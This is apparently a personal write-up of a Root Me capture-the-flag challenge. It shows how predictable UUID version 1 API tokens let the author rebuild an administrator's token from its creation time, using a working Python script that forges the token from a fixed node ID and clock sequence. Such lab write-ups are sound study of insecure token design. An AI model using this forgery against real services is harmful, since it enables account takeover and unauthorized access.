# Root Me: API - Broken Access 2

**Objective:** Compromise the Administrator account by predicting their secret API token.
**Vulnerability:** Predictable Token Generation (UUID v1).

---

## 1. Reconnaissance & Data Collection

To understand how the API tokens are generated, I created two test users (`test4` and `test5`) and compared them with an existing user (`test`). I analyzed the correlation between their **Creation Time** and their **API Token (UUID)**.

![[Pasted image 20251123200809.png]]
![[Pasted image 20251123200838.png]]
![[Pasted image 20251123201014.png]]

### Collected Data
| User      | Creation Time             | UUID Token                             |
| :-------- | :------------------------ | :------------------------------------- |
| **test**  | `2025-11-23 17:26:59.291` | `9ddea1b0-c891-11f0-9e05-0242ac100019` |
| **test4** | `2025-11-23 17:54:12.621` | `6b691f34-c895-11f0-9e05-0242ac100019` |
| **test5** | `2025-11-23 17:54:17.679` | `6e6cdd5c-c895-11f0-9e05-0242ac100019` |

---

## 2. Analysis: UUID Version 1

By comparing the tokens, I observed a distinct pattern. The last section of the UUID is identical for all users, while the first section changes based on the time.

**Static Parts:** `11f0-9e05-0242ac100019`
**Dynamic Parts:** The first segment (Time).

I used an online UUID decoder to verify the structure.
![[Pasted image 20251123202547.png]]

### The Logic Flaw
The application uses **UUID Version 1**.

* **Time-based:** The UUID is generated using the current timestamp.
* **Node ID:** The last part (`0242ac100019`) represents the server's MAC address (static).
* **Clock Sequence:** The middle part (`9e05`) often remains static or increments predictably.

**Conclusion:** If we know the exact **Creation Time** of the Admin account, and we know the **Node ID** (from our own tokens), we can mathematically reconstruct the Admin's token.

![[Pasted image 20251123202125.png]]

---

## 3. Exploitation

I identified the Admin's creation time (likely exposed via public metadata or user enumeration):
**Target Time:** `2025-11-23 03:10:51.118022`

I wrote a Python script to generate a valid UUID v1 using this specific timestamp and the extracted Node ID/Clock Sequence.

### Python Exploit Script
```python
import uuid
import datetime

# Target details found during Recon
admin_date_str = "2025-11-23 03:10:51.118022"
# الجزء الثابت اللي جبناه من التوكن بتاعك (MAC Address)
node_id = 0x0242ac100019  
# رقم التسلسل (Clock Sequence) وده كمان ثابت
clock_seq = 0x9e05      

def get_uuid1_from_time(date_string, node, clock_seq):

    dt = datetime.datetime.strptime(date_string, "%Y-%m-%d %H:%M:%S.%f")
    
    # UUID v1 is based on 100-nanosecond intervals since Oct 15, 1582
    uuid_epoch_offset = 12219292800
    unix_timestamp = dt.timestamp()
    uuid_time = int((unix_timestamp + uuid_epoch_offset) * 10000000)
    

    # Bitwise operations to construct the UUID fields
    time_low = uuid_time & 0xFFFFFFFF
    time_mid = (uuid_time >> 32) & 0xFFFF
    time_hi_version = (uuid_time >> 48) & 0x0FFF
    time_hi_version |= (1 << 12) # Set version bit to 1
    
    # Construct the final UUID object
    new_uuid = uuid.UUID(fields=(time_low, time_mid, time_hi_version, (clock_seq >> 8), (clock_seq & 0xFF), node))
    
    return new_uuid

admin_token = get_uuid1_from_time(admin_date_str, node_id, clock_seq)

print(f"Target Time: {admin_date_str}")
print(f"Generated Admin Token: {admin_token}")
```

### Execution

I ran the script to generate the token.

![[Pasted image 20251123203250.png]]

## 4. Result

I used the generated token to authenticate as the Administrator. The server accepted the token and returned the flag.

![[Pasted image 20251123203410.png]]
